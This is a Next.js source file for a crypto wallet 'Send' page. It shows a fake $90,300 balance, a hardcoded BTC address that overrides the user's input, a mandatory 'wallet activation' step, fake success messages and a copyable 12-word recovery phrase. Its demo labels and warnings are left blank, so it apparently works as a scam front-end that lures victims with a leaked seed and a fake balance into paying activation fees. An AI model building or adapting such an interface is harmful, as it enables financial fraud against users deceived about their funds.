"use client";

import { useMemo, useState } from "react";
import Image from "next/image";
import {
  ArrowLeft,
  ChevronDown,
  QrCode,
  User,
  FileText,
  Copy,
  Check,
  ShieldCheck,
  ShieldAlert,
  LockKeyhole,
} from "lucide-react";

type AssetSymbol = "TON" | "BTC" | "ETH" | "USDT" | "BNB";

const BTC_WITHDRAWAL_ADDRESS =
  "bc1qjasmwgsz7uxkmvapxpe66t4x5s437kj6f5gt96";

const BALANCE_USD = 90300;
const BTC_PRICE_USD = 90000;

const assets = [
  {
    symbol: "TON" as AssetSymbol,
    name: "Toncoin",
    price: 5,
    fee: 0.005,
    icon: "/coins/ton.png",
  },
  {
    symbol: "BTC" as AssetSymbol,
    name: "Bitcoin",
    price: 90000,
    fee: 0.00001,
    icon: "/coins/btc.png",
  },
  {
    symbol: "ETH" as AssetSymbol,
    name: "Ethereum",
    price: 3000,
    fee: 0.0005,
    icon: "/coins/eth.png",
  },
  {
    symbol: "USDT" as AssetSymbol,
    name: "Tether",
    price: 1,
    fee: 1,
    icon: "/coins/usdt.png",
  },
  {
    symbol: "BNB" as AssetSymbol,
    name: "BNB",
    price: 600,
    fee: 0.0005,
    icon: "/coins/bnb.png",
  },
];

// 12 WORDS 
const demoWalletWords = [
  "loyal",
  "usual",
  "brave",
  "nose",
  "december",
  "tattoo",
  "vapor",
  "sign",
  "jazz",
  "salute",
  "patrol",
  "trade",
];

export default function SendPage() {
  const [asset, setAsset] = useState<AssetSymbol>("BTC");
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");

  // Simulation du statut du wallet destinataire
  const [recipientWalletActive, setRecipientWalletActive] =
    useState(false);

  const [activating, setActivating] = useState(false);
  const [sending, setSending] = useState(false);
  const [copied, setCopied] = useState(false);
  const [wordsCopied, setWordsCopied] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  const [demoTransactionId, setDemoTransactionId] =
    useState("");

  const current = useMemo(
    () => assets.find((item) => item.symbol === asset) || assets[0],
    [asset]
  );

  // Soldes fictifs pour la démonstration
  const demoBtcBalance = BALANCE_USD / BTC_PRICE_USD;

  const currentBalance = BALANCE_USD / current.price;

  const networkFee = current.fee;

  const numericAmount =
    amount.trim() === "" ? 0 : Number(amount);

  const total =
    Number.isFinite(numericAmount)
      ? numericAmount + networkFee
      : 0;

  const maxAmount = Math.max(
    currentBalance - networkFee,
    0
  );

  const effectiveAddress =
    asset === "BTC" ? BTC_WITHDRAWAL_ADDRESS : address.trim();

  const validAddress =
    effectiveAddress.length >= 10 &&
    effectiveAddress.length <= 200;

  const canSend =
    recipientWalletActive &&
    validAddress &&
    numericAmount > 0 &&
    Number.isFinite(numericAmount) &&
    total <= currentBalance &&
    !sending;

  function changeAsset(newAsset: AssetSymbol) {
    setAsset(newAsset);
    setAddress("");
    setAmount("");
    setRecipientWalletActive(false);
    setError("");
    setSuccess("");
    setDemoTransactionId("");
  }

  function handleAddressChange(value: string) {
    setAddress(value);
    setRecipientWalletActive(false);
    setError("");
    setSuccess("");
  }

  function handleMax() {
    setAmount(maxAmount.toString());
    setError("");
  }

  // Activation fictive, uniquement dans l'interface
  function simulateWalletActivation() {
    if (!validAddress) {
      setError("Enter a valid recipient wallet address first.");
      return;
    }

    setActivating(true);
    setError("");
    setSuccess("");

    window.setTimeout(() => {
      setRecipientWalletActive(true);
      setActivating(false);
    }, 1200);
  }

  async function handleCopyAddress() {
    try {
      await navigator.clipboard.writeText(
        BTC_WITHDRAWAL_ADDRESS
      );

      setCopied(true);

      window.setTimeout(() => {
        setCopied(false);
      }, 2000);
    } catch {
      setError("Unable to copy the address.");
    }
  }

  // Copie des 12 mots 
  async function handleCopyWords() {
    try {
      await navigator.clipboard.writeText(
        demoWalletWords.join(" ")
      );

      setWordsCopied(true);

      window.setTimeout(() => {
        setWordsCopied(false);
      }, 2000);
    } catch {
      setError("Unable to copy the demo words.");
    }
  }

  // Simulation locale : aucun appel API et aucun transfert blockchain
  function handleSend() {
    setError("");
    setSuccess("");

    if (!recipientWalletActive) {
      setError(
        "Recipient wallet is not ACTIVE. Activate the wallet before continuing."
      );
      return;
    }

    if (!validAddress) {
      setError("Please enter a valid recipient address.");
      return;
    }

    if (
      !Number.isFinite(numericAmount) ||
      numericAmount <= 0
    ) {
      setError("Please enter a valid amount.");
      return;
    }

    if (total > currentBalance) {
      setError(
        "Keeper not active"
      );
      return;
    }

    setSending(true);

    window.setTimeout(() => {
      const reference =
        "" + Math.random().toString(36).substring(2, 10).toUpperCase();

      setDemoTransactionId(reference);
      setSuccess(
      "Request completed successfully."
      );

      setSending(false);
    }, 1000);
  }

  return (
    <main className="min-h-screen bg-[#050B18] text-white">
      <div className="max-w-md mx-auto px-5 py-6">

        {/* HEADER */}
        <div className="flex items-center justify-between mb-8">
          <button
            type="button"
            onClick={() => window.history.back()}
            className="w-12 h-12 rounded-2xl bg-[#101A2C] border border-slate-800 flex items-center justify-center"
          >
            <ArrowLeft size={24} />
          </button>

          <h1 className="text-3xl font-bold">Send</h1>

          <div className="w-12 h-12 rounded-2xl bg-[#101A2C] border border-slate-800 flex items-center justify-center">
            <FileText size={22} />
          </div>
        </div>

        {/* DEMO LABEL */}
        <div className="mb-5 rounded-2xl border border-yellow-500/30 bg-yellow-500/10 p-4">
          <p className="text-yellow-400 font-bold text-sm">
          
          </p>
          <p className="text-xs text-gray-300 mt-1">
            
          </p>
        </div>

        {/* BALANCE */}
        <div className="bg-[#101A2C] border border-slate-800 rounded-3xl p-5 mb-5">
          <p className="text-cyan-400 font-semibold">
            Available Balance
          </p>

          <h2 className="text-3xl font-bold mt-2">
            ${BALANCE_USD.toLocaleString("en-US", {
              minimumFractionDigits: 2,
              maximumFractionDigits: 2,
            })}
          </h2>

          <p className="text-sm text-gray-400 mt-2">
            BTC equivalent: {demoBtcBalance.toFixed(8)} BTC
          </p>
        </div>

        {/* ASSET SELECTOR */}
        <div className="bg-[#101A2C] border border-slate-800 rounded-3xl p-5 mb-5">
          <p className="text-cyan-400 font-semibold mb-4">
            Select Asset
          </p>

          <div className="flex items-center justify-between bg-[#0B1424] border border-slate-700 rounded-2xl p-4">
            <div className="flex items-center gap-3">
              <Image
                src={current.icon}
                alt={current.symbol}
                width={42}
                height={42}
              />

              <div>
                <h2 className="text-lg font-bold">
                  {current.symbol}
                </h2>
                <p className="text-sm text-gray-400">
                  {current.name}
                </p>
              </div>
            </div>

            <ChevronDown size={22} />
          </div>

          <div className="flex gap-3 overflow-x-auto mt-5 pb-2">
            {assets.map((coin) => (
              <button
                key={coin.symbol}
                type="button"
                onClick={() => changeAsset(coin.symbol)}
                className={`min-w-[82px] rounded-2xl border p-3 ${
                  asset === coin.symbol
                    ? "border-cyan-500 bg-[#16233D]"
                    : "border-slate-700 bg-[#0B1424]"
                }`}
              >
                <div className="flex flex-col items-center">
                  <Image
                    src={coin.icon}
                    alt={coin.symbol}
                    width={36}
                    height={36}
                  />

                  <span className="mt-2 text-sm font-semibold">
                    {coin.symbol}
                  </span>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* RECIPIENT WALLET */}
        <div className="bg-[#101A2C] border border-slate-800 rounded-3xl p-5 mb-5">
          <p className="text-cyan-400 font-semibold mb-4">
            Recipient Wallet
          </p>

          <div className="flex items-center bg-[#0B1424] border border-slate-700 rounded-2xl">
            <input
              type="text"
              value={
                asset === "BTC"
                  ? BTC_WITHDRAWAL_ADDRESS
                  : address
              }
              onChange={(e) =>
                handleAddressChange(e.target.value)
              }
              placeholder={`Enter ${current.symbol} wallet address`}
              disabled={asset === "BTC" || sending}
              className="flex-1 min-w-0 bg-transparent px-4 py-4 text-white outline-none text-xs placeholder:text-slate-500"
            />

            {asset !== "BTC" && (
              <>
                <button
                  type="button"
                  className="px-3 text-cyan-400"
                >
                  <QrCode size={22} />
                </button>

                <button
                  type="button"
                  className="px-3 text-cyan-400"
                >
                  <User size={22} />
                </button>
              </>
            )}
          </div>

          <p className="text-xs text-gray-500 mt-3">
            The recipient wallet must be active before a send request can continue.
          </p>
        </div>

        {/* RECIPIENT WALLET ACTIVATION STATUS */}
        <div
          className={`rounded-3xl border p-5 mb-5 ${
            recipientWalletActive
              ? "bg-green-500/10 border-green-500/40"
              : "bg-[#101A2C] border-red-500/40"
          }`}
        >
          <div className="flex items-center gap-3">
            {recipientWalletActive ? (
              <ShieldCheck
                size={30}
                className="text-green-400"
              />
            ) : (
              <ShieldAlert
                size={30}
                className="text-red-400"
              />
            )}

            <div>
              <p className="text-gray-400 text-sm">
                Recipient Wallet Status
              </p>

              <h3
                className={`text-xl font-bold mt-1 ${
                  recipientWalletActive
                    ? "text-green-400"
                    : "text-red-400"
                }`}
              >
                {recipientWalletActive
                  ? "ACTIVE"
                  : "INACTIVE"}
              </h3>
            </div>
          </div>

          {recipientWalletActive ? (
            <p className="text-sm text-green-300 mt-4">
              You can continue with the request.
            </p>
          ) : (
            <>
              <p className="text-sm text-gray-300 mt-4">
                This recipient wallet must be ACTIVE before you can proceed with the transfer.
              </p>

              <button
                type="button"
                onClick={simulateWalletActivation}
                disabled={activating || !validAddress}
                className="w-full mt-5 h-12 rounded-xl bg-cyan-500 hover:bg-cyan-600 font-bold text-white disabled:opacity-40"
              >
                {activating
                  ? "Checking wallet..."
                  : "WALLET ACTIVATION"}
              </button>
            </>
          )}
        </div>

        {/* AMOUNT */}
        <div className="bg-[#101A2C] border border-slate-800 rounded-3xl p-5 mb-5">
          <div className="flex items-center justify-between mb-4">
            <p className="text-cyan-400 font-semibold">
              Amount
            </p>

            <p className="text-xs text-gray-400">
              Balance: {currentBalance.toFixed(8)} {current.symbol}
            </p>
          </div>

          <div className="relative">
            <input
              type="number"
              min="0"
              step="any"
              value={amount}
              onChange={(e) => {
                setAmount(e.target.value);
                setError("");
                setSuccess("");
              }}
              placeholder="0.00"
              className="w-full bg-[#0B1424] border border-slate-700 rounded-2xl px-5 py-5 pr-24 text-2xl font-bold text-white outline-none"
            />

            <button
              type="button"
              onClick={handleMax}
              className="absolute right-4 top-1/2 -translate-y-1/2 bg-cyan-500 px-4 py-2 rounded-xl text-sm font-semibold"
            >
              Max
            </button>
          </div>

          <div className="flex justify-between mt-4 text-sm">
            <span className="text-gray-400">
              Network Fee
            </span>
            <span>
              {networkFee} {current.symbol}
            </span>
          </div>

          <div className="flex justify-between mt-2 text-lg font-bold">
            <span>Total</span>
            <span className="text-cyan-400">
              {total.toFixed(8)} {current.symbol}
            </span>
          </div>
        </div>

        {/* TRANSACTION SUMMARY */}
        <div className="bg-[#101A2C] border border-slate-800 rounded-3xl p-5 mb-5">
          <h2 className="text-lg font-bold mb-4">
            Transaction Summary
          </h2>

          <div className="space-y-3 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-400">Asset</span>
              <span>{current.symbol}</span>
            </div>

            <div className="flex justify-between">
              <span className="text-gray-400">Amount</span>
              <span>
                {numericAmount.toFixed(8)} {current.symbol}
              </span>
            </div>

            <div className="flex justify-between">
              <span className="text-gray-400">Network Fee</span>
              <span>
                {networkFee} {current.symbol}
              </span>
            </div>

            <div className="border-t border-slate-700 pt-3 flex justify-between font-bold">
              <span>Total</span>
              <span className="text-cyan-400">
                {total.toFixed(8)} {current.symbol}
              </span>
            </div>
          </div>
        </div>

        {/* ERROR */}
        {error && (
          <div className="mb-5 rounded-2xl border border-red-500/30 bg-red-500/10 p-4">
            <p className="text-sm text-red-400">
              {error}
            </p>
          </div>
        )}

        {/* SUCCESS */}
        {success && (
          <div className="mb-5 rounded-2xl border border-green-500/30 bg-green-500/10 p-4">
            <h3 className="font-bold text-green-400">
               Request Completed
            </h3>

            <p className="mt-2 text-sm text-gray-300">
              {success}
            </p>

            {demoTransactionId && (
              <p className="mt-3 text-xs text-gray-400 break-all">
                 Reference: {demoTransactionId}
              </p>
            )}
          </div>
        )}

        {/* SEND BUTTON */}
        <button
          type="button"
          onClick={handleSend}
          disabled={!canSend}
          className="w-full h-14 rounded-2xl bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-bold text-lg disabled:opacity-40 disabled:cursor-not-allowed"
        >
          {sending
            ? "Processing..."
            : recipientWalletActive
              ? `Send ${current.symbol}`
              : "Recipient Wallet Must Be ACTIVE"}
        </button>

        {!recipientWalletActive && (
          <p className="text-center text-xs text-red-400 mt-3">
            <LockKeyhole
              size={13}
              className="inline mr-1"
            />
            Activate the recipient wallet to continue.
          </p>
        )}

        {/* BTC WALLET ADDRESS */}
        <div className="mt-6 bg-[#101A2C] border border-cyan-500/30 rounded-3xl p-5">
          <h3 className="text-cyan-400 text-lg font-bold">
            BTC Withdrawal Wallet
          </h3>

          <p className="text-xs text-gray-400 mt-2">
             Recipient address.
          </p>

          <div className="mt-4 bg-[#0B1424] border border-slate-700 rounded-2xl p-3">
            <p className="text-xs text-white break-all leading-6">
              {BTC_WITHDRAWAL_ADDRESS}
            </p>
          </div>

          <button
            type="button"
            onClick={handleCopyAddress}
            className="w-full mt-4 h-12 rounded-xl bg-cyan-500 hover:bg-cyan-600 text-white font-bold flex items-center justify-center gap-2"
          >
            {copied ? (
              <>
                <Check size={18} />
                COPIED
              </>
            ) : (
              <>
                <Copy size={18} />
                COPY ADDRESS
              </>
            )}
          </button>
        </div>

        {/* 12-WORD WALLET SECTION */}
        <div className="mt-6 bg-[#101A2C] border border-cyan-500/30 rounded-3xl p-5">
          <h3 className="text-cyan-400 text-lg font-bold">
            Wallet Recovery Words
          </h3>

          <p className="text-sm text-gray-300 mt-2">
            
          </p>

          <div className="grid grid-cols-3 gap-3 mt-5">
            {demoWalletWords.map((word, index) => (
              <div
                key={index}
                className="flex items-center gap-2 rounded-xl border border-slate-700 bg-[#0B1424] p-3"
              >
                <span className="text-xs text-slate-500">
                  {index + 1}.
                </span>

                <span className="text-sm text-white font-medium">
                  {word}
                </span>
              </div>
            ))}
          </div>

          <button
            type="button"
            onClick={handleCopyWords}
            className="w-full mt-5 h-14 rounded-2xl bg-cyan-500 hover:bg-cyan-600 text-white font-bold flex items-center justify-center gap-2"
          >
            {wordsCopied ? (
              <>
                <Check size={20} />
                COPIED SUCCESSFULLY
              </>
            ) : (
              <>
                <Copy size={20} />
                COPY ALL WORDS
              </>
            )}
          </button>

          <p className="text-xs text-yellow-400 mt-3">
            
          </p>
        </div>

        {/* SECURITY NOTICE */}
        <div className="mt-6 rounded-3xl border border-yellow-500/30 bg-yellow-500/10 p-5">
          <h3 className="text-yellow-400 text-lg font-bold">
            Security Notice
          </h3>

          <ul className="mt-3 space-y-2 text-sm text-gray-300">
            <li>• Check the recipient address carefully.</li>
            <li>• The recipient wallet must be active.</li>
            <li>• Network fees are illustrative in demo mode.</li>
            <li>• No real cryptocurrency is transferred.</li>
          </ul>
        </div>

      </div>
    </main>
  );
}